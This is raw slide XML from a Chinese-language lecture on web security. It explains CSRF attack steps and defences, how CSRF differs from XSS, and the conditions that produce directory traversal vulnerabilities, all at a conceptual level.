            </a:prstGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:noFill/>
              <a:prstDash val="dash"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle>
              <a:defPPr>
                <a:defRPr lang="zh-CN"/>
              </a:defPPr>
              <a:lvl1pPr algn="ctr">
                <a:defRPr>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:pPr algn="l"/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>5. </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>根据</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>B</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>在步骤</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>4</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>的要求，浏览器带着步骤</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>2</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>处产生的</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>cookie</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>访问网站</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>A</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="17" name="直接箭头连接符 16"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1354744" y="1609709"/>
              <a:ext cx="4846071"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354744" y="2209681"/>
              <a:ext cx="4846071"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1347328" y="3005496"/>
              <a:ext cx="4846071"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a:off x="1347328" y="4057837"/>
              <a:ext cx="4846071" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="straightConnector1">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1368693" y="5187260"/>
              <a:ext cx="4846071"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现在绝大多数网站都不会使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>请求来进行数据更新，而是采用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>来提交，即使这样，攻击者仍然能够实施</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</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r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466947" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="601663" y="1411288"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>现有银行的网银交易流程要比</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>例子</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>复杂得多，同时还需要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>USB key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、验证码、登录密码和支付密码等一系列安全信息，一般并不存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>安全漏洞，安全是有保障的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>。  </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6947">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="466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69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r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="464899" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1443327"/>
            <a:ext cx="7772400" cy="4624964"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4300"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>重大的差别：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4300"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>利用的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器端的漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4300"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>利用的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>客户端的漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4300"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击是实施</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击前的一个重要步骤：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPts val="4300"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击获取有用的攻击信息，比如通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>伪造一个提示用户输入身份信息的表单。</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4899">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="464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4899">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4648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48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4899">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4648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4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4899">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4648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4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4899">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46489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48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r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466947" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="629371" y="1328161"/>
            <a:ext cx="7891173" cy="4781694"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>设定短暂的可信用户会话时间，完成任务后记得退出可信会话，删除所有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>每次提出一个可信行为时，对发出请求的用户进行验证；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>让网站记住登录用户名和密码时要小心。留在客户端的登录信息可能会攻击者加以利用；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>和表单中增加的每个请求，必须提供基本会话令牌以外的每个请求用户验证；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用程序中删除所有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>漏洞。  </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6947">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="466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69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6947">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4669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69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6947">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46694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69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6947">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46694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69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6947">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46694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694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r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466947" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="629371" y="1328161"/>
            <a:ext cx="7891173" cy="4781694"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="图片 1"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="841230" y="1228220"/>
            <a:ext cx="6962775" cy="4981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466947">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4669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69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五、目录遍历及其防范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9" y="1221655"/>
            <a:ext cx="8305078" cy="5289982"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>许多</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>应用支持外界以参数的形式来指定服务器上的文件名，如果服务器在处理用户请求时</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>不</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>对文件名进行充分校验，就可能</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>出</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>问题，如：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件被非法获取</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>，导致重要信息被泄露；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件被篡改</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>，如篡改网页内容以发布不实消息，设置圈套将用户诱导至恶意网站，篡改脚本文件从而在服务器上执行任意脚本等；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件被删除</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>，如删除脚本文件或配置文件导致服务器宕机等</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>目录遍历</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9" y="1595728"/>
            <a:ext cx="7515369" cy="4777363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>一般来</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>说</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用满足以下</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>个条件时，就有可能产生目录遍历漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>外界能够指定文件名</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>能够使用绝对路径或相对路径等形式来指定其它目录的文件名</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>没有对拼接后的文件名进行校验就允许访问该文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
